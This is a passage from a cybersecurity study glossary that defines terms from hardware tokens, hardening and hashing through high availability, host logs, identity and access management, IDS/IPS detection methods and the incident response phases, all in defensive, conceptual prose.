2. One-time password (OTP) - A password that is generated for use in one specific session and becomes invalid after the session ends. Refers to a cryptoprocessor that can generate a token. This type of hardware token does not need an interface to connect with a computer; the user just reads the code displayed.

3. Security key - Portable HSM with a computer interface, such as USB or NFC, used for multifactor authentication. Refers to a portable hardware security module (HSM) with a computer interface, such as USB or NFC. They are most closely associated with U2F, but some might also support certificate-based authentication or HOTP/TOTP. A security key must be activated to show presence. Some keys just have an activation button, but most use a biometric fingerprint reader for better security. A PIN must also be configured as a backup mechanism.

There are also simpler smart cards and fobs that simply transmit a static token programmed into the device. For example, many building entry systems work on the basis of static codes. These mechanisms are highly vulnerable to cloning and replay attacks.
Hardening - A process of making a host or app configuration secure by reducing its attack surface, through running only necessary services, installing monitoring software to protect against malware and intrusions, and establishing a maintenance schedule to ensure the system is patched to be secure against software exploits.

Network equipment, software, and operating systems use default settings from the developer or manufacturer which attempt to balance ease of use with security. Default configurations are an attractive target for attackers as they usually include well-documented credentials, allow simple passwords, use insecure protocols, and many other problematic settings. By leaving these default settings in place, organizations increase the likelihood of successful cyberattacks. Therefore, it's crucial to change these default settings to improve security.

Hardening describes (A process of making a host or app configuration secure by reducing its attack surface, through running only necessary services, installing monitoring software to protect against malware and intrusions, and establishing a maintenance schedule to ensure the system is patched to be secure against software exploits) the methods to improve a device's security by changing its default configuration, often by implementing the recommendations in published secure baselines.

Switches and Routers
Examples of changes designed to improve the security of switches and routers from the default settings include the following:

1. Change Default Credentials -  That are well documented and pose a significant security risk.

2. Disable Unnecessary Services and Interfaces - On a switch or router. Not every service or interface is needed. For example, services like HTTP or Telnet should be avoided.

3. Use Secure Management Protocols - Such as SSH instead of Telnet or HTTPS instead of HTTP.

4. Implement Access Control Lists (ACLs) - To restrict access to the router or switch to only required devices and networks.

5. Enable Logging and Monitoring - To help identify issues like repeated login failures, configuration changes, and many others.

6. Configure Port Security - Helps limit the devices that can connect to a switch port to prevent unauthorized access.

7. Strong Password Policies - Help reduce the risk of password attacks.

8. Physically Secure Equipment - Like keeping devices in a locked room to prevent unauthorized physical access.

Server Hardware and Operating Systems
Examples of changes designed to improve the security of servers from the default settings include the following:

1. Change Default Credentials - To prevent unauthorized access, similar to network devices.

2. Disable Unnecessary Services - To reduce the attack surface of the server. Each service running on a server represents a potential point of entry for an attacker.

3. Apply Software Security Patches and Updates Regularly -  to fix known vulnerabilities and provide security improvements. Automated patch management ensures this process is consistent and timely.

4. Least Privilege Principle - Limits each user to the least amount of privilege necessary to perform a function to reduce the impact of a compromised account.

5. Use Firewalls and Intrusion Detection Systems (IDS) - To help block or alert on malicious activity.

6. Secure Configuration - Servers should use baseline configurations such as those provided by the CIS or STIGs.

7. Strong Access Controls - Include strong password policies, multifactor authentication (MFA), and privileged access management (PAM).

8. Enable Logging and Monitoring - To help identify issues like repeated login failures, configuration changes, and many others similar to the benefits for network equipment.

9. Use Antivirus and Antimalware Solutions - To detect and quarantine malware automatically.

10. Physical Security - Security of server equipment racks, server rooms, or datacenters prevents unauthorized access.
Hardware Security Module (HSM) - An appliance for generating and storing cryptographic keys. This sort of solution may be less susceptible to tampering and insider threats than software-based storage.

A  Hardware security module (HSM) is cryptoprocessor hardware implemented in a removable or dedicated form factor, including rack-mounted appliances, plug-in PCIe adapter cards, and USB-connected security keys. It is also possible to provision an HSM as a virtual appliance. Where a TPM is designed to validate the security of a discrete computing platform such as a desktop computer or laptop, an HSM provides either centralized key storage for network hosts or portable key storage that people can use on different devices.
Hash-based Message Authentication Code (HMAC) - A method used to verify both the integrity and authenticity of a message by combining a cryptographic hash of the message with a secret key.

A HMAC combines the secret key derived during key exchange with a hash of the message.
Hashing - A function that converts an arbitrary-length string input to a fixed-length string output. A cryptographic hash function does this in a way that reduces the chance of collisions, where two different inputs produce the same output.
Hashing Algorithm - A cryptographic hashing algorithm produces a fixed-length string of bits from an input plaintext that can be of any length. The output can be referred to as a hash or as a message digest. The function is designed so that it is impossible to recover the plaintext data from the digest (one-way) and so that different inputs are unlikely to produce the same output (a collision).

A hashing algorithm is used to prove integrity. For example, Bob and Alice can compare the values used for a password in the following way:

1. Bob has a digest calculated from Alice's plaintext password. Bob cannot recover the plaintext password value from the hash.

2. When Alice needs to authenticate to Bob, they type their password, converts it to a hash, and sends the digest to Bob.

3. Bob compares Alice's digest to the hash value on file. If they match, Bob can be sure that Alice typed the same password.

As well as comparing password values, a hash of a file can be used to verify the integrity of that file after transfer.

1. Alice runs a hash function on the setup.exe file for their product. They publish the digest on their website with a download link for the file.

2. Bob downloads the setup.exe file and makes a copy of the digest.

3. Bob runs the same hash function on the downloaded setup.exe file and compares it to the reference value published by Alice. If it matches the value published on the website, Bob assumes the file has integrity.

4. Consider that Mallory might be able to substitute the download file for a malicious file. 
Mallory cannot change the reference hash, however.

5. This time, Bob computes a hash but it does not match, leading him to suspect that the file has been tampered with.
Health Insurance Portability and Accountability Act (HIPAA) - US federal law that protects the storage, reading, modification, and transmission of personal healthcare data.

The Health Insurance Portability and Accountability Act (HIPAA) sets out reporting requirements in legislation, requiring breach notification to the affected individuals, the Secretary of the US Department of Health and Human Services, and, if more than 500 individuals are affected, to the media.
Heat Map (Risk) - A simple approach is the heat map or "traffic light" impact matrix. For each risk, a simple red, yellow, or green indicator can be put into each column to represent the severity of the risk, its likelihood, cost of controls, and so on. This approach is simplistic but does give an immediate impression of where efforts should be concentrated to improve security.

FIPS 199 discusses how to apply security categorizations (SC) to information systems based on the impact that a breach of confidentiality, integrity, or availability would have on the organization as a whole. Potential impacts can be classified as the following:

1. Low - Minor damage or loss to an asset or loss of performance (though essential functions remain operational).

2. Moderate - Significant damage or loss to assets or performance.

3. High - Major damage or loss or the inability to perform one or more essential functions.
Heat Map Risk Matrix - A graphical table indicating the likelihood and impact of risk factors identified for a workflow, project, or department for reference by stakeholders.
Heuristics - A method that uses feature comparisons and likenesses rather than specific signature matching to identify whether the target of observation is malicious.
High Availability - High availability (HA) is crucial in IT infrastructure, ensuring systems remain operational and accessible with minimal downtime. It involves designing and implementing hardware components, servers, networking, datacenters, and physical locations for fault tolerance and redundancy. In a high-availability setup, redundant hardware components, such as power supplies, hard drives, and network interfaces, reduce the risk of failure by allowing the system to continue functioning if one component fails. Servers are often deployed in clusters or paired configurations, which allows automatic failover from a primary server to a secondary server in case of an issue.

Networking components, including switches, routers, and load balancers, are also designed with redundancy in mind to maintain seamless connectivity. As the backbone of high-availability infrastructure, datacenters employ redundant power sources, cooling systems, and backup generators to ensure continuous operation.

Additionally, organizations may deploy datacenters in geographically diverse locations to mitigate the impact of natural disasters or other large-scale events, further enhancing high availability and disaster recovery capabilities.

The concept of "availability" can be measured over a defined period, such as one year. Availability can be measured as an uptime value, or percentage. It can also be calculated as the time or percentage that a system is unavailable (downtime). The maximum tolerable downtime (MTD) metric expresses the availability requirement for a particular business function. High availability is usually loosely described as 24x7 (24 hours per day, 7 days per week) or 24x365 (24 hours per day, 365 days per year). For a critical system, availability is described using the "nines" term, such as two-nines (99%) up to five- or six-nines (99.9999%).

Downtime is calculated from the sum of scheduled service intervals plus unplanned outages over the period.

System availability can refer to an overall process, but also to availability at the level of a server or individual component.

Scalability and Elasticity
High availability also means that a system can cope with rapid growth in demand. These properties are referred to as scalability and elasticity. Scalability is the capacity to increase resources to meet demand within similar cost ratios. This means that if service demand doubles, costs do not more than double. There are two types of scalability:

1. To scale out is to add more resources in parallel with existing resources.

2. To scale up is to increase the power of existing resources.
Elasticity refers to the system's ability to handle these changes on demand in real time. A system with high elasticity will not experience a loss of service or performance if demand suddenly increases rapidly.

Fault Tolerance and Redundancy
A system that can experience failures and continue to provide the same (or nearly the same) level of service is said to be fault tolerant (Protection against system failure by providing extra (redundant) capacity. Generally, fault tolerant systems identify and eliminate single points of failure). Fault tolerance is often achieved by provisioning redundancy (overprovisioning resources at the component, host, and/or site level so that there is failover to a working instance in the event of a problem) for critical components and single points of failure. A redundant component is one that is not essential to the normal function of a system but that allows the system to recover from the failure of another component.

Site Considerations
Enterprise environments often provision resiliency at the site level. An alternate processing or recovery site is a location that can provide the same (or similar) level of service. An alternate processing site might always be available and in use, while a recovery site might take longer to set up or only be used in an emergency.

Operations are designed to failover to the new site until the previous site can be brought back online. Failover is a technique that ensures a redundant component, device, application, or site can quickly and efficiently take over the functionality of an asset that has failed. For example, load balancers provide failover in the event that one or more servers or sites behind the load balancer are down or are taking too long to respond. Once the load balancer detects this, it will redirect inbound traffic to an alternate processing server or site. Thus, redundant servers in the load balancer pool ensure there is no or minimal interruption of service.

Site resiliency is described as hot, warm, or cold:

1. A hot site (A fully configured alternate processing site that can be brought online either instantly or very quickly after a disaster) can failover almost immediately. It generally means the site is within the organization's ownership and ready to deploy. For example, a hot site could consist of a building with operational computer equipment kept updated with a live data set.

2. A warm site (An alternate processing location that is dormant or performs noncritical functions under normal conditions, but which can be rapidly converted to a key operations site if needed) could be similar, but with the requirement that the latest data set needs to be loaded.

3. A cold site (A predetermined alternate location where a network can be rebuilt after a disaster) takes longer to set up. A cold site may be an empty building with a lease agreement in place to install whatever equipment is required when necessary.
Providing redundancy on this scale is generally very complicated and expensive. Another issue is that creating duplicate sites and data also doubles (or more) the complexity of securing the resources. The same security procedures must apply to redundant sites, spare systems, and backup data as apply to the main copy.

Geographic dispersion (A resiliency mechanism where processing and data storage resources are replicated between physically distant sites) refers to the distribution of recovery sites across different geographic locations for disaster recovery (DR) purposes. The concept aims to ensure that recovery sites are located far enough apart to minimize the impact of regional disasters, such as natural calamities or localized incidents. By strategically dispersing recovery sites, organizations can ensure the resilience of their recovery strategies and reduce the risk of a single catastrophic event affecting all business operations.

Cloud as Disaster Recovery (DR)
Several factors drive organizations to use cloud services for datacenter or site redundancy. Cost efficiency plays a significant role, as cloud providers offer more affordable redundancy and backup options due to their economies of scale.

"Economies of scale" is a concept that refers to the cost advantages that businesses can achieve when they increase production and output. Essentially, the more a company produces, the cheaper it becomes to deliver those products.

The scalability of cloud services allows businesses to incorporate redundant capabilities without over-provisioning resources. For example, geographic diversity provided by cloud providers helps protect against regional outages or disasters, but incorporating this type of redundancy for a private organization would be cost-prohibitive and unwarranted.

Faster deployment of capabilities when using cloud platforms enables organizations to set up and deploy redundant systems quickly, far more rapidly than could be done when building infrastructure from scratch.

Simplified management is another critical factor, with cloud providers offering tools and services that reduce the complexity of managing redundant infrastructure. Improved security and compliance are also important considerations, as cloud providers invest heavily in these areas, helping organizations meet data protection and redundancy regulatory requirements.

Testing Redundancy and High Availability
Testing high availability, load balancing, and failover technologies is critical and is designed to assess the ability to remain operational during heavy workloads, component failures, or scheduled maintenance.

1. Load testing incorporates specialized software tools to validate a system's performance under expected or peak loads and identify bottlenecks or scalability issues.

2. Failover testing focuses on validating failover processes to ensure a seamless transition between primary and secondary infrastructure.

3. Testing monitoring systems validate effective detection and response to failures and performance issues.

Robust testing practices allow organizations to ensure that high availability, load balancing, and failover technologies effectively fulfill their purpose to minimize unexpected outages and maximize performance.
High Availability Across Zones (Cloud) - CSPs divide the world into regions. Each region is independent of the others. The regions are divided into availability zones. The availability zones have independent datacenters with their own power, cooling, and network connectivity. You can choose to host data, services, and VM instances in a particular region to provide a lower latency service to customers. Provisioning resources in multiple zones and regions can also improve performance and increases redundancy, but it requires an adequate level of replication performance.

Consequently, CSPs offer several tiers of replication representing different high availability service levels:

1. Local Replication - Replicates your data within a single datacenter in the region where you created your storage account. The replicas are often in separate fault domains and upgrade domains.

2. Regional Replication (also called zone-redundant storage) - Replicates your data across multiple datacenters within one or two regions. This safeguards data and access in the event a single datacenter is destroyed or goes offline.

3. Geo-redundant Storage (GRS) - Replicates your data to a secondary region that is distant from the primary region. This safeguards data in the event of a regional outage or a disaster.
Honeypots - A host (honeypot), network (honeynet), file (honeyfile), or credential/token (honeytoken) set up with the purpose of luring attackers away from assets of actual value and/or discovering attack strategies and weaknesses in the security configuration.
Host Operating System Logs - An operating system (OS) keeps a variety of logs to record events as users and software interact with the system. Different log files represent different aspects of system functionality. These files are intended to hold events of the same general nature. Some files hold events from different process sources; others are utilized by a single source only.

Operating system-specific security logs record audit events. Audit events are usually classed either as success/accept or fail/deny.

1. Authentication events record when users try to sign in and out. An event is also likely to be generated when a user tries to obtain special or administrative privileges.

2. File system events record whether use of permissions to read or modify a file was allowed or denied. As this would generate a huge amount of data if enabled for all file system objects by default, file system auditing usually needs to be explicitly configured.

Windows Logs
The three main Windows event log files are the following:

1. Application - Events generated by application processes, such as when there is a crash, or when an app is installed or removed.

2. Security - Audit events, such as a failed login or access to a file being denied.

3. System - Events generated by the operating system's kernel processes and services, such as when a service or driver cannot start, when a service's startup type is changed, or when the computer shuts down.

Linux Logs
Linux logging can be implemented differently for each distribution. Some distributions use syslog to direct messages relating to a particular subsystem to a flat text file. Other distributions use Journald as a unified logging system with a binary, rather than plaintext, file format. Journald messages are read using the journalctl command, but it can be configured to export some messages to text files via syslog.

Some of the principal log files are as follows:

1. /var/log/messages or /var/log/syslog stores all events generated by the system. Some of these are copied to individual log files.

2. /var/log/auth.log (Debian/Ubuntu) or /var/log/secure (RedHat/CentOS/Fedora) records login attempts, use of sudo privileges, and other authentication and authorization data. Additionally, the faillog specifically tracks failed login events. Some distros use wtmp, utmp, and btmp files for use with commands such as w, who, and last to identify sessions and failed logins.

3. The package manager log (apt, yum, or dnf, depending on the distro) stores information about what software has been installed and updated.

macOS Logs
macOS uses a unified logging system, which can be accessed via the graphical Console app, or the log command. The log command can be used with filters to review security-related events, such as login (com.apple.login), app installs (com.apple.install), and system policy violations (com.apple.syspolicy.exec).
Host-based Firewalls - A software application running on a single host and designed to protect only that host.
Host-based Intrusion Detection (HIDS) - A type of IDS that monitors a computer system for unexpected behavior or drastic changes to the system's state.
Host-based Intrusion Prevention (HIPS) - Endpoint protection that can detect and prevent malicious activity via signature and heuristic pattern matching.
Hot Site - A fully configured alternate processing site that can be brought online either instantly or very quickly after a disaster. A hot site can failover almost immediately. It generally means the site is within the organization's ownership and ready to deploy. For example, a hot site could consist of a building with operational computer equipment kept updated with a live data set.
HTML5 VPN - Using features of HTML5 to implement remote desktop/VPN connections via browser software (clientless).

In the past, these remote desktop products required a dedicated client app. Remote desktop access can now just use a web browser client. The canvas element introduced in HTML5 allows a browser to draw and update a desktop with relatively little lag. It can also handle audio. This is referred to as an HTML5 VPN or as a clientless remote desktop gateway. This solution uses a protocol called WebSocket, which enables bidirectional messages to be sent between the server and client without requiring the overhead of separate HTTP requests.
Human Vector - Adversaries can use a diverse range of techniques to compromise a security system. A prerequisite of many types of attacks is to obtain information about the network and security system. This knowledge is not only stored on computer disks; it also exists in the minds of employees and contractors. The people operating computers and accounts are a part of the attack surface referred to as human vectors.
Human-readable Data - Information stored in a file type that human beings can access and understand using basic viewer software, such as documents, images, video, and audio.
Human-Readable Data - Information stored in a file type that human beings can access and understand using basic viewer software, such as documents, images, video, and audio.

Human-readable data refers to information that humans can easily understand and interpret without additional processing or translation. Human-readable data describes a format that is accessible and readable, such as text, images, or multimedia content. Examples of human-readable data include documents, reports, emails, web pages, and presentations.

Human-readable and non-human-readable data formats have distinct implications for security operations and controls. Human-readable and non-human-readable data formats impact security operations and controls in different ways. Security monitoring, user awareness, DLP, content filtering, and web security are more directly applicable to human-readable data formats.

On the other hand, encryption, access controls, intrusion detection and prevention, secure data exchange, and code/application security are more relevant to non-human-readable data formats. It is important to note that non-human-readable data formats can impede the capabilities of security controls because non-human-readable data formats cannot be easily interpreted using traditional methods and require specialized approaches to inspect and protect them. A comprehensive security approach considers both types of data formats and implements appropriate measures to protect them based on their characteristics and associated risks.
Hybrid Cloud - A cloud deployment that uses both private and public elements.

A hybrid cloud most commonly describes a computing environment combining public and private cloud infrastructures, although any combination of cloud infrastructures constitutes a hybrid cloud. In a hybrid cloud, companies can store data in a private cloud but also leverage the resources of a public cloud when needed. This allows for greater flexibility and scalability, as well as cost savings. A hybrid cloud is commonly used because it enables companies to take advantage of the benefits of both private and public clouds. Private clouds can provide greater security and control over data, while public clouds offer more cost-effective scalability and access to a broader range of resources. A hybrid cloud also allows for a smoother transition to the cloud for companies that may need more time to migrate all of their data.

A hybrid cloud also presents security challenges, such as managing multiple cloud environments and enforcing consistent security policies. One issue is the complexity of managing multiple cloud environments and integrating them with on-premises infrastructure, which can create security gaps and increase the risk of data breaches. Another concern is the potential for unauthorized access to data and applications, particularly when sensitive information is stored in the public cloud. There are often mistakes caused by confusion over the boundary between on-premises and public cloud infrastructure. Additionally, using multiple cloud providers can make it challenging to enforce consistent security policies across all environments.

A hybrid cloud infrastructure can provide data redundancy features, such as replicating data across on-premises and cloud infrastructure. Data protection can be achieved through redundancy, but it can also lead to issues with data consistency stemming from synchronization problems among multiple locations. Considering that legal compliance is a critical concern when implementing any type of cloud environment, organizations must ensure that data stored in both the on-premises and cloud components of the hybrid environment comply with these mandates. This adds additional complexity to data governance and security operations.

Another consideration is the establishment and enforcement of service-level agreements (SLAs). SLAs formally outline all performance, availability, and support expectations between the cloud service provider and the organization. Guaranteeing expected levels of service can be challenging when dealing with the integration of different cloud and on-premises systems. Other concerns related to the hybrid cloud include the potential for increased network latency due to large data transfer volumes between on-premises and cloud environments that impact application performance, and monitoring the hybrid environment can be more complex due to the requirement for specialized expertise and tools.
Hybrid Password Attack - An attack that uses multiple attack methods, including dictionary, rainbow table, and brute force attacks when trying to crack a password.

A hybrid password attack uses a combination of dictionary and brute force attacks. It is principally targeted against naive passwords with inadequate complexity, such as james1 . The password cracking algorithm tests dictionary words and names in combination with a mask that limits the number of variations to test for, such as adding numeric prefixes and/or suffixes.
Identification (IAM) - The process by which a user account (and its credentials) is issued to the correct person. Sometimes referred to as enrollment. It is creating an account or ID that uniquely represents the user, device, or process on the network.
Identity and Access Management (IAM) - A security process that provides identification, authentication, and authorization mechanisms for users, computers, and other entities to work with organizational assets like networks, operating systems, and applications.

IAM comprises four main processes:

1. Identification - Creating an account or ID that uniquely represents the user, device, or process on the network.

2. Authentication - Proving that a subject is who or what it claims to be when it attempts to access the resource. An authentication factor determines what sort of credential the subject can use. For example, people might be authenticated by providing a password; a computer system could be authenticated using a token such as a digital certificate.

3. Authorization - Determining what rights subjects should have on each resource, and enforcing those rights. An authorization model determines how these rights are granted. For example, in a discretionary model, the object owner can allocate rights. In a mandatory model, rights are predetermined by system-enforced rules and cannot be changed by any user within the system.

4. Accounting - Tracking authorized usage of a resource or use of rights by a subject and alerting when unauthorized use is detected or attempted.

For example, if you are setting up an e-commerce site and want to enroll users, you need to select the appropriate controls to perform each function:

1. Identification - Ensure that customers are legitimate. For example, you might need to ensure that billing and delivery addresses match and that they are not trying to use fraudulent payment methods.

2. Authentication - Ensure that customers have unique accounts and that only they can manage their orders and billing information.

3. Authorization - Rules to ensure customers can place orders only when they have valid payment mechanisms in place. You might operate loyalty schemes or promotions that authorize certain customers to view unique offers or content.

4. Accounting - The system must record the actions a customer takes (to ensure that they cannot deny placing an order, for instance).

Remember that these processes apply both to people and to systems. For example, you need to ensure that your e-commerce server can authenticate its identity when customers connect to it using a web browser.
Identity Provider (IdP) - In a federated network, the service that holds the user account and performs authentication.
IDS and IPS Detection Methods - In an IDS, the analysis engine is the component that scans and interprets the traffic captured by the sensor with the purpose of identifying suspicious traffic. The analysis engine determines an event's classification with typical options of ignore, log only, alert, and block (IPS). A set of programmed rules drives the analysis engine's decision-making process. There are several methods of formulating the ruleset.

Signature-Based Detection
Signature-based detection (A network monitoring system that uses a predefined set of rules provided by a software vendor or security personnel to identify events that are unacceptable. Also known as pattern-matching) means that the engine is loaded with a database of attack patterns or signatures. If traffic matches a pattern then the engine generates an incident.

The signatures and rules (often called plug-ins or feeds) powering intrusion detection need to be updated regularly to provide protection against the latest threat types. Commercial software requires a paid-for subscription to obtain the updates. It is important to configure software to update only from valid repositories, ideally using a secure connection method such as HTTPS.

Behavioral- and Anomaly-Based Detection
Behavioral-based detection (A network monitoring system that detects changes in normal operating data sequences and identifies abnormal sequences) means the engine is trained to recognize baseline "normal" traffic or events. Anything that deviates from this baseline (outside a defined level of tolerance) generates an incident. The software will be able to identify zero-day attacks, insider threats, and other malicious activity for which there is no single signature.

Historically, network behavior and anomaly detection (NBAD - A security monitoring tool that monitors network packets for anomalous behavior based on known signatures) products provide this type of detection. An NBAD engine uses heuristics (meaning to learn from experience) to generate a statistical model of what baseline normal traffic looks like. It may develop several profiles to model network use at different times of the day. This means that the system generates false positives and false negatives until it has had time to improve its statistical model of what is "normal." A false positive is where legitimate behavior generates an alert, while a false negative is where malicious activity is not alerted.

While NBAD products were relatively unsophisticated, using machine learning in more recent products has made them more productive. As identified by Gartner's market analysis (gartner.com/en/documents/3917096/market-guide-for-user-and-entity-behavior-analytics), there are two general classes of behavior-based detection products that utilize machine learning:

1. User and entity behavior analytics (UEBA) - Are products that scan indicators from multiple intrusion detection and log sources to identify anomalies. They are often integrated with security information and event management (SIEM) platforms.

2. Network traffic analysis (NTA) - Are products similar to IDS and NBAD in that they apply analysis techniques only to network streams rather than multiple network and log data sources.

Often behavioral- and anomaly-based detection are taken to mean the same thing (in the sense that the engine detects anomalous behavior). This may not always be the case. Anomaly-based detection can also mean specifically looking for irregularities in the use of protocols. For example, the engine may check packet headers or the exchange of packets in a session against RFC standards and generate an alert if they deviate from strict RFC compliance.

Trend Analysis
Trend analysis (The process of detecting patterns within a dataset over time, and using those patterns to make predictions about future events or to better understand past events) is a critical aspect of managing intrusion detection systems (IDS) and intrusion prevention systems (IPS) as it aids in understanding an environment over time, helping to identify patterns, anomalies, and potential threats. Security analysts can identify patterns and trends that indicate ongoing or growing threats by tracking events and alerts. For example, an increase in alerts related to a specific attack may suggest that a network is being targeted for attack or that a vulnerability is being actively exploited. Trending can also help in tuning IDS/IPS systems. Over time, security analysts can identify false positives or unnecessary alerts that appear frequently. These alerts can be tuned down so analysts can focus on more important alerts.

Trending data can contribute to operational security strategies by identifying common threats and frequently targeted systems. This approach highlights areas of weakness that need attention, either through changes in security policy or investment in additional security tools and training.
IM (Message-Based Vector) - There are many replacements for SMS that run on Windows, Android, or iOS devices. These can support voice and video messaging plus file attachments. Most of these services are secured using encryption and offer considerably more security than SMS, but they can still contain software vulnerabilities. The use of encryption can make it difficult for an organization to scan messages and attachments for threats.
Image Files (Lure-Based Vector) - The threat actor conceals exploit code within an image file that targets a vulnerability in browser or document editing software.
Impact Analysis (Change Management) - This is the process of identifying and assessing the potential implications of a proposed change, including how the change will impact individual users, business processes, or interconnected systems.
Impersonation - Social engineering attack where an attacker pretends to be someone they are not.

Impersonation simply means pretending to be someone else. It is one of the basic social engineering techniques. Impersonation is possible when the target cannot verify the attacker's identity easily, such as over the phone or via an email message. A threat actor will typically use one of two approaches:

1. Persuasive / consensus / liking - convince the target that the request is a natural one that would be impolite or somehow "odd" to refuse.

2. Coercion /threat / urgency - intimidate the target with a bogus appeal to authority or penalty, such as getting fired or not acting quickly enough to prevent some dire outcome.
Implicit Deny - The basic principle of security stating that unless something has explicitly been granted access, it should be denied access. If the firewall does not have a default implicit deny rule, an explicit deny all rule can be added manually to the end of the ACL.
Implicit TLS (FTPS) - A type of FTP using TLS for confidentiality.

It negotiates an SSL/TLS tunnel before the exchange of any FTP commands. This mode uses the secure port 990 for the control connection.
Impossible Travel - A potential indicator of malicious activity where authentication attempts are made from different geographical locations within a short timeframe. This indicates that the threat actor is attempting to use remote access to sign in to an account from a geographic location that they would not have physically been able to move to in the time since their last sign in.
In-Band Management - An in-band management link shares traffic with other communications on the production network. The connection method must use TLS, IPsec, RDP, or SSH encrypted sessions to ensure confidentiality and integrity.
Incident Response - Analysis - After the detection process reports one or more indicators, in the analysis (An incident response process in which indicators are assessed to determine validity, impact, and category) process, the first responder investigates the data to determine whether a genuine incident has been identified and what level of priority it should be assigned. Conversely, the report might be categorized as a false positive and dismissed. Classification of a true positive incident event often relies on correlating multiple indicators. For a complex or high-impact event, the analysis might be escalated to senior CIRT team members.

When an incident is verified as a true positive, the next objective is to identify the type of incident and the data or resources affected. This establishes incident category and impact and allows the assignment of a priority level.

Impact
Several factors affect the process of determining impact:

1. Data Integrity - The most important factor in prioritizing incidents will often be the value of data that is at risk.

2. Downtime - Is the degree to which an incident disrupts business processes, another very important factor. An incident can either degrade (reduce performance) or interrupt (completely stop) the availability of an asset, system, or business process.

3. Economic/publicity - Both data integrity and downtime have important economic effects in the short term and the long term. Short-term costs involve incident response and lost business opportunities. Long-term economic costs may involve damage to reputation and market standing.

4. Scope - (Broadly the number of systems affected) is not a direct indicator of priority. A large number of systems might be infected with a type of malware that degrades performance but is not a data breach risk. This might even be a masking attack as the adversary seeks to compromise data on a single database server storing top-secret information.

5. Detection Time - Research has shown that more than half of data breaches are not detected for weeks or months after the intrusion occurs, while in a successful intrusion, data is typically breached within minutes. Systems used to search for intrusions must be thorough and the response to detection must be fast.

6. Recovery Time - Some incidents require lengthy remediation as the system changes required are complex to implement. This extended recovery period should trigger heightened alertness for continued or new attacks.

Category
Incident categories and definitions ensure that all response team members and other organizational personnel have a shared understanding of the meaning of terms, concepts, and descriptions.

Effective incident analysis depends on threat intelligence. This research provides insight into adversary tactics, techniques, and procedures (TTPs). Insights from threat research can be used to develop specific tools and playbooks to deal with event scenarios. A key tool for threat research is the framework used to describe the stages of an attack. These stages are often referred to as a cyber kill chain (A model developed by Lockheed Martin that describes the stages by which a threat actor progresses to a network intrusion) , following the influential white paper Intelligence-Driven Computer Network Defense commissioned by Lockheed Martin

Playbooks
The CIRT should develop profiles or scenarios of typical incidents, such as DDoS attacks, virus/worm outbreaks , data exfiltration by an external adversary, data modification by an internal adversary, and so on. This guides investigators in determining priorities and remediation plans.

A playbook (A checklist of actions to perform to detect and respond to a specific type of incident) is a data-driven standard operating procedure (SOP) to assist analysts in detecting and responding to specific cyber threat scenarios. The playbook starts with a report from an alert dashboard. It then leads the analyst through the analysis, containment, eradication, recovery, and lessons learned steps to take.
Incident Response - Containment - Following detection and analysis, the incident management database should have a record of the event indicators, the nature of the incident, its impact, and the investigator responsible for managing the case. The next phase of incident management is to determine an appropriate response.

As incidents cover a wide range of different scenarios, technologies, motivations, and degrees of seriousness, there is no standard approach to containment or incident isolation. Some of the many complex issues facing the CIRT are the following:

1. What damage or theft has occurred already? How much more could be inflicted and in what sort of time frame (loss control)?

2. What countermeasures are available? What are their costs and implications?

3. What actions could alert the threat actor that the attack has been detected? What evidence of the attack must be gathered and preserved?

4. What notification or reporting is required at this stage of the incident?
Containment techniques can be classed as either isolation-based or segmentation-based.

Isolation-Based Containment
Isolation involves removing an affected component from whatever larger environment it is a part of. This can be everything from removing a server from the network after it has been the target of a denial of service attack to placing an application in a sandbox outside the host environments it usually runs on. Isolation removes any interface between the affected system and the production network or the Internet.

A simple option is to disconnect the host from the network by pulling the network plug (creating an air gap) or disabling its switch port. This is the least stealthy option and will reduce opportunities to analyze the attack or malware.

If a group of hosts is affected, you could use routing infrastructure to isolate one or more infected virtual LANs (VLANs) in a sinkhole (A DoS attack mitigation strategy that directs the traffic that is flooding a target IP address to a different network for analysis) that is not reachable from the rest of the network. Another possibility is to use firewalls or other security filters to prevent infected hosts from communicating.

Finally, isolation could also refer to disabling a user account or application service. Temporarily disabling users' network accounts may prove helpful in containing damage if an intruder is detected within the network. Without privileges to access resources, an intruder will not be able to further damage or steal information from the organization. Applications that you suspect may be the vector of an attack can be much less effective to the attacker if the application is prevented from executing on most hosts.

Segmentation-Based Containment
Segmentation-based containment is a means of achieving the isolation of a host or group of hosts using network technologies and architecture. Segmentation uses VLANs, routing/subnets, and firewall ACLs to prevent a host or group of hosts from communicating outside the protected segment. As opposed to completely isolating the hosts, you might configure the protected segment as a sinkhole or honeynet and allow the attacker to continue to receive filtered (and possibly modified) output to deceive them into thinking the attack is progressing successfully. This facilitates analysis of the threat actor's TTPs and, potentially, their identity. Attribution of the attack to a particular group will allow an estimation of adversary capability.
Incident Response - Detection - An incident response process that correlates event data to determine whether they are indicators of an incident.

Detection is the process of correlating events from network and system data sources and determining whether they are indicators of an incident. There are multiple channels by which indicators may be recorded:

Matching events in log files, error messages, IDS alerts, firewall alerts, and other data sources to a pattern of known threat behavior.
Identifying deviations from baseline system metrics.
Manually or physically inspecting the site, premises, networks, and hosts. Running a proactive search for signs of intrusion is referred to as threat hunting.
Notification by an employee, customer, or supplier.
Publicly reporting new vulnerabilities or threats by a system vendor, regulator, the media, or other outside party.
It is wise to provide an option for confidential reporting so that employees are not afraid to report insider threats such as fraud or misconduct.

When a suspicious event is detected, it is critical that the appropriate person on the CIRT be notified so that they can take charge of the situation and formulate the appropriate response. This person is referred to as the first responder (The first experienced person or team to arrive at the scene of an incident). Employees at all levels of the organization must be trained to recognize and respond appropriately to actual or suspected security incidents.
Incident Response - Eradication and Recovery - After an incident has been contained, the eradication (An incident response process in which malicious tools and configurations on hosts and networks are removed) process applies mitigation techniques and controls to remove the intrusion tools and unauthorized configuration changes from systems.

When traces of malware, backdoors, and compromised accounts have been eliminated, the recovery (An incident response process in which hosts, networks, and systems are brought back to a secure baseline configuration) process ensures restoration of capabilities and services. This means that hosts are fully reconfigured to operate the business workflow they were performing before the incident. An essential part of recovery is the process of ensuring that the system cannot be compromised through the same attack vector, or failing that, that the vector is closely monitored to provide advance warning of another attack.

Eradication of malware or other intrusion mechanisms and recovery from the attack will involve several steps:

1. Reconstitution of affected system - By either removing the malicious files or tools from affected systems or restoring the systems from secure backups/images.

If reinstalling from baseline template configurations or images, make sure that there is nothing in the baseline that allowed the incident to occur! If so, update the template before rolling it out again.

2. Reaudit security controls - By ensuring they are not vulnerable to another attack. This could be the same attack or from some new attack that the attacker could launch through information they have gained about the network.

If the organization is subjected to a targeted attack, be aware that one incident may be very quickly followed by another.

